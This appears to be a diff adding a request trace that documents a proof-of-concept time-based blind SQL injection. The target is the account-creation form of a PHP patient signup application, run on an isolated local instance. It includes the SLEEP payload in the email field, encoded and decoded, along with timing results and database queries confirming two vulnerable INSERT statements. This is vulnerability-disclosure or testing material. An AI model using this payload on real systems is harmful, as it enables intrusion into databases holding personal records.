@@ -1,0 +1,42 @@
+Raw request trace (decoded payloads) - local isolated instance, MySQL 8.0.39 / PHP 8.4.26.
+
+# --- Step 1: personal details (sets $_SESSION['personal']) -------------------
+POST /signup.php HTTP/1.1
+Host: target.local
+Content-Type: application/x-www-form-urlencoded
+
+fname=Night&lname=Tester&address=1+Test+St&nic=987654321&dob=2000-01-01
+
+-> HTTP 302 (redirect to create-account.php); keep PHPSESSID
+
+# --- Step 2 baseline: benign email -------------------------------------------
+POST /create-account.php HTTP/1.1
+Host: target.local
+Cookie: PHPSESSID=<session from step 1>
+Content-Type: application/x-www-form-urlencoded
+
+newemail=clean1@test.local&newpassword=x123&cpassword=x123&tele=999
+
+-> HTTP 302 in 0.017 s; patient + webuser rows created normally
+
+# --- Step 2 payload: time-based blind INSERT SQLi ----------------------------
+# newemail decodes to: 1'+(SELECT SLEEP(5))+'1
+POST /create-account.php HTTP/1.1
+Host: target.local
+Cookie: PHPSESSID=<session from step 1>
+Content-Type: application/x-www-form-urlencoded
+
+newemail=1%27%2B%28SELECT%20SLEEP%285%29%29%2B%271&newpassword=x123&cpassword=x123&tele=999
+
+-> HTTP 302 in 10.049 s  (2 x SLEEP(5): BOTH INSERT statements evaluate the
+   injected expression - sink 1: create-account.php:68 (patient INSERT),
+   sink 2: create-account.php:69 (webuser INSERT))
+
+# --- DB proof (harmless stored-value evidence) -------------------------------
+SELECT pemail, pname, ppassword, ptel FROM patient WHERE pemail='2';
+-> 2 | Night Tester | x123 | 999   (pemail stores the evaluated expression = 2)
+SELECT * FROM webuser WHERE email='2';
+-> 2 | p                        (second INSERT sink confirmed)
+
+# Note: the duplicate-check SELECT (create-account.php:59-63) is a prepared
+# statement (bind_param) and is NOT injectable.
